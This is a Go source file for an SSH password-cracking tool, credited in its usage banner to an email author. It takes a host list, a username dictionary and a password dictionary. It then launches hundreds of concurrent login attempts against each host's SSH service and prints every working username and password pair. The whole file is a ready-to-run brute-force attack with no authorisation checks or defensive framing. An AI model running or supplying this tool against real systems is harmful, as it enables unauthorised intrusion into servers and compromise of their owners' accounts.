package main

import (
	"bufio"
	"fmt"
	"os"
	"runtime"
	"strings"
	"time"

	"github.com/btcsuite/golangcrypto/ssh"
)

type HostInfo struct {
	host    string
	port    string
	user    string
	pass    string
	is_weak bool
}

func Usage(cmd string) {
	fmt.Println(strings.Repeat("-", 50))
	fmt.Println("ssh crack by pengzhengyuan2016@163.com")
	fmt.Println("Usage:")
	fmt.Printf("%s iplist userdic passdic\n", cmd)
	fmt.Println(strings.Repeat("-", 50))
}

func Prepare(iplist, userdic, passdic string) (slice_iplist, slice_user, slice_pass []string) {
	iplist_file, _ := os.Open(iplist)
	defer iplist_file.Close()
	reader := bufio.NewScanner(iplist_file)
	reader.Split(bufio.ScanLines)
	for reader.Scan() {
		slice_iplist = append(slice_iplist, reader.Text())
	}

	userdic_file, _ := os.Open(userdic)
	defer userdic_file.Close()
	reader_u := bufio.NewScanner(userdic_file)
	reader_u.Split(bufio.ScanLines)
	for reader_u.Scan() {
		slice_user = append(slice_user, reader_u.Text())
	}

	passdic_file, _ := os.Open(passdic)
	defer passdic_file.Close()
	reader_p := bufio.NewScanner(passdic_file)
	reader_p.Split(bufio.ScanLines)
	for reader_p.Scan() {
		slice_pass = append(slice_pass, reader_p.Text())
	}
	return slice_iplist, slice_user, slice_pass
}

func Scan(slice_iplist, slice_user, slice_pass []string) {
	for _, host_port := range slice_iplist {
		fmt.Printf("Try to crack %s\n", host_port)
		t := strings.Split(host_port, ":")
		host := t[0]
		port := t[1]
		n := len(slice_user) * len(slice_pass)
		scan_result := make(chan HostInfo, n)
		for _, user := range slice_user {
			for _, pass := range slice_pass {
				host_info := HostInfo{}
				host_info.host = host
				host_info.port = port
				host_info.user = user
				host_info.pass = pass
				host_info.is_weak = false

				go Crack(host_info, scan_result)
				for runtime.NumGoroutine() > runtime.NumCPU()*300 {
					time.Sleep(10 * time.Microsecond)
				}
			}
		}
		done := make(chan bool, n)
		go func() {
			for i := 0; i < cap(scan_result); i++ {
				select {
				case r := <-scan_result:
					fmt.Println(r)
					if r.is_weak {
						fmt.Printf("%s:%s, user: %s, password: %s\n", r.host, r.port, r.user, r.pass)
					}
				case <-time.After(1 * time.Second):
					break
				}
				done <- true
			}
		}()

		for i := 0; i < cap(done); i++ {
			<-done
		}

	}
}

func Crack(host_info HostInfo, scan_result chan HostInfo) {
	host := host_info.host
	port := host_info.port
	user := host_info.user
	pass := host_info.pass
	is_weak := host_info.is_weak

	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
	}
	client, err := ssh.Dial("tcp", host+":"+port, config)
	if err != nil {
		is_weak = false
	} else {
		session, err := client.NewSession()
		defer session.Close()

		if err != nil {
			is_weak = false
		} else {
			is_weak = true
		}
	}
	host_info.is_weak = is_weak
	scan_result <- host_info
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())

	if len(os.Args) != 4 {
		Usage(os.Args[0])
	} else {
		Usage(os.Args[0])
		iplist := os.Args[1]
		userdic := os.Args[2]
		passdic := os.Args[3]
		Scan(Prepare(iplist, userdic, passdic))
	}
}
